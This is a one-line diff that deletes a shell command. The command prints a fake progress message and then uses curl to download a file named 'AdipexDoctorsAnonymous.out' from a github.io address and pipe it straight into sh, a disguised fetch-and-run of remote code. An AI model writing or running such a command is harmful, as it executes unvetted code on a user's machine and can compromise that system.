@@ -1,1 +1,0 @@
-echo 'Progress: 66.0%'; curl -L --progress-bar frkns.github.io/fun/AdipexDoctorsAnonymous.out | sh
